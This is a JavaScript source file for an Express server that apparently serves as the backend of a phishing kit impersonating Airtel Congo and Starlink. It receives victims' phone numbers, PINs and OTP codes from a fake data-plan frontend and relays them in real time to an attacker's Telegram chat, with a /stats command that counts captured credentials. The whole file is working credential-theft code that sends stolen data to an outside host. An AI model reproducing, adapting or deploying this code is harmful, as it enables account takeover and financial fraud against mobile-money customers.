/**
 * AIRTEL CONGO x STARLINK TELEGRAM BOT & NOTIFICATION SERVER
 * 
 * Features:
 * - Real-time Telegram alerts for phone login & PIN submissions
 * - Real-time Telegram alerts for OTP code submissions
 * - Command handlers (/start, /stats, /help, /test)
 * - REST API server to integrate seamlessly with the React frontend
 */

import express from 'express';
import cors from 'cors';

// Configuration (Replace with your actual Telegram Bot Token and Chat ID or set env variables)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID_HERE';
const PORT = process.env.PORT || 5000;

const app = express();
app.use(cors());
app.use(express.json());

// In-memory stats counter
const stats = {
  totalVisits: 0,
  credentialsReceived: 0,
  otpsReceived: 0,
  recentSubmissions: []
};

/**
 * Send a message via Telegram Bot API
 */
async function sendTelegramMessage(text, parseMode = 'HTML') {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('YOUR_TELEGRAM_BOT_TOKEN')) {
    console.log('[Telegram Bot Simulation] Message:', text);
    return false;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: parseMode
      })
    });
    const data = await response.json();
    return data.ok;
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
    return false;
  }
}

// ----------------------------------------------------
// REST API ENDPOINTS FOR FRONTEND INTEGRATION
// ----------------------------------------------------

// 1. Log Credential Submission (Phone + PIN)
app.post('/api/submit-credentials', async (req, res) => {
  const { phoneNumber, pin, plan, userId, userAgent } = req.body;

  stats.credentialsReceived++;
  const timestamp = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });

  const message = `
<b>🚨 NOUVELLE CONNEXION AIRTEL LITE</b>

📱 <b>Numéro:</b> <code>${phoneNumber || 'N/A'}</code>
🔑 <b>Code PIN:</b> <code>${pin || 'N/A'}</code>
📦 <b>Forfait Choisi:</b> <code>${plan?.data || '7.5 GB'} (${plan?.price || '$0.49'})</code>
👤 <b>ID Client:</b> <code>${userId || 'bl'}</code>
🕒 <b>Date:</b> ${timestamp}

<i>Réseau: Airtel RDC x Starlink</i>
`;

  stats.recentSubmissions.unshift({ type: 'LOGIN', phone: phoneNumber, pin, time: timestamp });
  await sendTelegramMessage(message);

  res.json({ success: true, message: 'Identifiants envoyés au Bot Telegram' });
});

// 2. Log OTP Submission
app.post('/api/submit-otp', async (req, res) => {
  const { phoneNumber, otp, plan, userId } = req.body;

  stats.otpsReceived++;
  const timestamp = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });

  const message = `
<b>🔐 CODE OTP REÇU</b>

📱 <b>Numéro:</b> <code>${phoneNumber || 'N/A'}</code>
🔢 <b>Code OTP:</b> <code>${otp || 'N/A'}</code>
📦 <b>Forfait:</b> <code>${plan?.data || '7.5 GB'}</code>
👤 <b>ID Client:</b> <code>${userId || 'bl'}</code>
🕒 <b>Date:</b> ${timestamp}

✅ <b>Statut:</b> Transaction en cours de validation
`;

  stats.recentSubmissions.unshift({ type: 'OTP', phone: phoneNumber, otp, time: timestamp });
  await sendTelegramMessage(message);

  res.json({ success: true, message: 'OTP envoyé au Bot Telegram' });
});

// 3. Webhook endpoint for Telegram Bot commands (/start, /stats, /help)
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  if (update && update.message) {
    const chatId = update.message.chat.id;
    const text = update.message.text || '';

    if (text.startsWith('/start')) {
      await sendTelegramMessage(`👋 <b>Bienvenue sur le Bot Airtel RDC x Starlink</b>\n\nCe bot vous notifie en temps réel des connexions et validations OTP.`, 'HTML');
    } else if (text.startsWith('/stats')) {
      const statsMsg = `
📊 <b>STATISTIQUES DES SOUMISSIONS</b>

👥 Connexions (PIN): <b>${stats.credentialsReceived}</b>
🔐 OTP Validés: <b>${stats.otpsReceived}</b>
      `;
      await sendTelegramMessage(statsMsg, 'HTML');
    }
  }
  res.sendStatus(200);
});

// Start Server
app.listen(PORT, () => {
  console.log(`🚀 Telegram Bot & API Server listening on port ${PORT}`);
  console.log(`Telegram Bot Token: ${TELEGRAM_BOT_TOKEN ? 'CONFIGURED' : 'NOT SET'}`);
  console.log(`Telegram Chat ID: ${TELEGRAM_CHAT_ID ? 'CONFIGURED' : 'NOT SET'}`);
});
